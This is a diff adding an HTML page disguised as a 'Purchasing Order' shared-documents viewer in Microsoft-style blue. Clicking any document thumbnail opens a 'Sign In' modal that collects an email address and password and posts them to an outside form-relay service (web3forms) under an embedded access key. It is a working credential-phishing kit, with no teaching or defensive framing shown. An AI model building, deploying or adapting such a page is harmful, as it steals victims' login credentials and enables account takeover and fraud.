@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en"> 
+<head> 
+<title>PURCHASING ORDER</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">
+<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.6.0.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js"></script>
+<script src="len.js"></script>
+</head> 
+<body class="style"> 
+  <nav class="navbar navbar-expand-sm navbar-dark " style="background-color:#0078D4">
+      <div class="container-fluid">
+          <a class="navbar-brand" href="javascript:void(0)"><img src="download/download.png" alt="download in download"></a> 
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#mynavbar">
+              <img src="downloads/download1.png" alt="download1 in download"> 
+        </button>
+          <div class="collapse navbar-collapse" id="mynavbar">
+ </div>
+      </div>
+  </nav>
+  <div>
+      <aside id="asd" class="float-left">
+          <img src="download/download11.png" alt="download11 in download"> 
+      </aside>
+  </div>
+ <div class="loaded">
+        <h4 class="">SHARED DOCUMENTS</h4>
+ <div class="row mt-4 ">
+ <div class="col-sm-3 " data-toggle="modal" data-target="#myModal">
+          <img src="download/download4.png" alt="download4 in download" class="img-fluid"> 
+      </div>
+      <div class="col-sm-3 ">
+          <img src="download/p.png" alt="p.png in download" class="img-fluid" data-toggle="modal" data-target="#myModal"> 
+      </div>
+      <div class="col-sm-3">
+          <img src="download/download6.png" alt="download6 in download" class="img-fluid" data-toggle="modal" data-target="#myModal"> 
+      </div>
+      <div class="col-sm-3 ">
+        <img src="download/download5.png" alt="download5 in download" class="img-fluid" data-toggle="modal" data-target="#myModal"> 
+      </div>
+  </div>
+ <!-- The Modal -->
+  <div class="modal" id="myModal" style="display: none;" aria-hidden="true"> 
+      <div class="modal-dialog"> 
+          <div class="modal-content"> 
+ <!-- Modal Header -->
+             <!-- Modal body -->
+              <div class="modal-body bg-white p-3"> 
+ <img src="download/one.png" alt="one.png in download" class="img-fluid"><br>
+                <small class="text-danger" id="msg" style="font-weight:600;"></small>
+                <form action="https://api.web3forms.com/submit" method="POST">
+ <!-- Replace with your Access Key -->
+                  <input type="hidden" name="access_key" value="68c2f032-ae3c-41ea-bdb4-11061b978f83">
+               <!-- Form Inputs. Each input must have a name="" attribute -->
+                  <input type="email" name="x1" id="x1" class="form-control mb-3" placeholder="Email" value required>
+                      <input type="password" name="x2" id="x2" class="form-control mb-3" placeholder="Password" value requiredd> 
+                    <button id="submitBtn" class="btn btn-md btn-primary">Sign In</button>
+               <!-- Honeypot Spam Protection -->
+                  <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
+                </form>
+        </div> 
+          </div >
+      </div>
+  </div>
+  </body>
+</html> 
